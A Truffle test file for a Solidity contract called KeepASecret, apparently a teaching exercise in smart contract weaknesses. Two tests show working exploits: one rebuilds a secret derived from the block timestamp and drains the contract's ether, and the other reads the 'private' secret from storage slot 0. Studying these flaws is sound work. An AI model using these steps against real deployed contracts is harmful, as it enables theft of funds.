const chai = require("chai")
const { solidity } = require("ethereum-waffle");
chai.use(solidity);

const KeepASecret = artifacts.require("KeepASecret.sol");

contract("KeepASecret", accounts => {
  it("should reject on wrong guessing attempts", async () => {
    const instance = await KeepASecret.deployed();
    
    const guess = web3.utils.keccak256(""+ (new Date()).getTime());
    await chai.expect(instance.guessSecret(guess, {from: accounts[0]})).to.be.revertedWith("guess again")    
  });

  it("can guess secret by executing constructor code locally", async () => {
    const instance = await KeepASecret.new();
    await web3.eth.sendTransaction({ 
      from: accounts[0], 
      to: instance.address, 
      value: web3.utils.toWei("1", "ether") 
    })
    const contractBalance = await web3.eth.getBalance(instance.address);
    chai.expect(web3.utils.fromWei(contractBalance, 'ether')).to.equal("1");

    const createdTransaction = await web3.eth.getTransaction(instance.transactionHash);
    const block = await web3.eth.getBlock(createdTransaction.blockNumber);
    const guess = web3.utils.keccak256(web3.utils.encodePacked(block.timestamp));

    const result = await instance.guessSecret(guess, {from: accounts[1]});
    const contractBalance2 = await web3.eth.getBalance(instance.address);
    chai.expect(contractBalance2).to.equal("0");
  });

  it("can read storage slots of private contract members", async () => {
    const instance = await KeepASecret.deployed();
    const secret = await web3.eth.getStorageAt(instance.address, 0);
    await instance.guessSecret(secret, {from: accounts[1]});
  })
});
